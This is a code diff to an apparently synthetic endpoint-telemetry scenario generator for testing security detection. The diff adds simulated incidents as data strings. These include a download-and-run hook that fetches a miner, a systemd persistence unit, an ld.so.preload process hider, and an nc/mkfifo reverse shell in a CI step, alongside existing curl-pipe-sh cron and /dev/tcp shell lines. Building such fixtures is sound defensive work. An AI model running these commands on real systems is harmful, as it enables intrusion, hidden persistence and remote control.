@@ -24,7 +24,11 @@ export const STORY = {
   napped: 'ENG-WS-07',
   withholds: 'WEB-SRV-09',
   tooLarge: 'WEB-SRV-11',
-  proving: ['WEB-SRV-04', 'WEB-SRV-09'],
+  miner: 'WEB-SRV-02',
+  stolenKey: 'WEB-SRV-06',
+  pipeline: 'WEB-SRV-13',
+  // The lab VMs still run the agent release from before proving, so their windows show what an endpoint without a prover looks like
+  noProver: 'LAB',
 }
 
 const WITHHELD_RULES = ['server-child', 'reverse-shell']
@@ -83,6 +87,13 @@ const PLANTED = [
   ['cron', 'sysupdate', '/etc/cron.d/sysupdate', '* * * * * root curl -fsS http://203.0.113.47/u | sh', 'root'],
   ['authorized_key', 'root@build', '/root/.ssh/authorized_keys', 'ssh-ed25519', 'root'],
 ]
+// A cryptominer that came in through a dependency keeps itself alive from a folder anyone can write to
+const MINER_UNIT = [['systemd_unit', 'fontconfig-cache.service', '/etc/systemd/system/fontconfig-cache.service', '/var/tmp/.font-unix/kdevtmpfsi --donate-level 1', 'root']]
+// Whoever logged in with a stolen deploy key leaves a key for root and a library every process loads
+const BACKDOOR = [
+  ['authorized_key', 'ops@jump', '/root/.ssh/authorized_keys', 'ssh-ed25519', 'root'],
+  ['ld_preload', 'libprocesshider.so', '/etc/ld.so.preload', '/usr/local/lib/libprocesshider.so', 'root'],
+]
 
 function inventory(endpoint, when) {
   const packages = PACKAGES.map(([name, version]) => ({
@@ -100,7 +111,9 @@ function inventory(endpoint, when) {
     Persistence: { timestamp: when, action, kind, name, path, command, user, enabled: true, hash: null },
   })
   const planted = endpoint.host === STORY.webShell ? PLANTED.map(item('Added', when(915))) : []
-  return [...packages, ...AUTOSTART.map(item('Present', when(0))), ...planted]
+  const kept = endpoint.host === STORY.miner ? MINER_UNIT.map(item('Added', when(1130))) : []
+  const backdoor = endpoint.host === STORY.stolenKey ? BACKDOOR.map(item('Added', when(1260))) : []
+  return [...packages, ...AUTOSTART.map(item('Present', when(0))), ...planted, ...kept, ...backdoor]
 }
 
 const USER_APPS = {
@@ -193,6 +206,33 @@ function telemetry(endpoint, now, random) {
       write(915, implant, '/tmp/.cache/kworker', '/root/.ssh/authorized_keys')
       remove(918, implant, '/tmp/.cache/kworker', '/var/log/nginx/access.log')
       exit(930, shell, 904, '/usr/bin/sh')
+    }
+    if (endpoint.host === STORY.miner) {
+      const install = next()
+      start(1100, install, 1000, '/usr/bin/npm', ['install', '--omit=dev'], 1001)
+      const hook = next()
+      start(1104, hook, install, '/usr/bin/sh', ['-c', 'wget -qO- http://203.0.113.80/i.sh | sh'], 1001)
+      connect(1105, hook, '/usr/bin/sh', '203.0.113.80', 80, 280, 2100000)
+      write(1108, hook, '/usr/bin/sh', '/var/tmp/.font-unix/update.sh')
+      const miner = next()
+      start(1112, miner, hook, '/var/tmp/.font-unix/kdevtmpfsi', ['--donate-level', '1', '-o', '203.0.113.80:3333'], 1001)
+      connect(1114, miner, '/var/tmp/.font-unix/kdevtmpfsi', '203.0.113.80', 3333, 48000, 9200)
+      exit(1120, install, 1000, '/usr/bin/npm')
+    }
+    if (endpoint.host === STORY.stolenKey) {
+      const session = next()
+      start(1240, session, 700, '/usr/sbin/sshd', ['-D', '-R'])
+      const login = next()
+      start(1242, login, session, '/usr/bin/bash', ['-l'], 1002)
+      write(1250, login, '/usr/bin/bash', '/usr/local/lib/libprocesshider.so')
+      exit(1290, login, session, '/usr/bin/bash')
+    }
+    if (endpoint.host === STORY.pipeline) {
+      const runner = next()
+      start(980, runner, 1, '/opt/actions-runner/bin/Runner.Listener', ['run'], 1003)
+      const step = next()
+      start(1000, step, runner, '/usr/bin/bash', ['-e', '-c', 'mkfifo /tmp/.p; nc 203.0.113.81 9001 < /tmp/.p | /bin/sh > /tmp/.p 2>&1'], 1003)
+      connect(1002, step, '/usr/bin/bash', '203.0.113.81', 9001, 5200, 880)
     }
     if (endpoint.host === STORY.withholds) {
       start(1010, next(), 1100, '/usr/bin/bash', ['-c', 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1'], 113)
@@ -329,7 +369,7 @@ function timestamp(event) {
   return Object.values(event)[0].timestamp
 }
 
-export function scenario({ server, deploymentKey, stateDir, prover, enrollmentKeys, now }) {
+export function scenario({ server, deploymentKey, stateDir, enrollmentKeys, now }) {
   const random = seeded(20261116)
   const endpoints = fleet().map((endpoint, position) => {
     const stopped = stops(endpoint, now)
@@ -342,11 +382,11 @@ export function scenario({ server, deploymentKey, stateDir, prover, enrollmentKe
       version: endpoint.version,
       ip_address: endpoint.ip,
       enrollment_key: enrollmentKeys[position],
-      proving: STORY.proving.includes(endpoint.host),
+      proving: endpoint.group !== STORY.noProver,
       withhold: endpoint.host === STORY.withholds ? WITHHELD_RULES : [],
       stays_up: stopped.length === 0 && !STORY.quiet.includes(endpoint.host),
       timeline: timeline.sort((a, b) => timestamp(a) - timestamp(b)),
     }
   })
-  return { server, deployment_key: deploymentKey, state_dir: stateDir, prover, heartbeat_seconds: HEARTBEAT_SECONDS, endpoints }
+  return { server, deployment_key: deploymentKey, state_dir: stateDir, stand_in_proofs: true, heartbeat_seconds: HEARTBEAT_SECONDS, endpoints }
 }
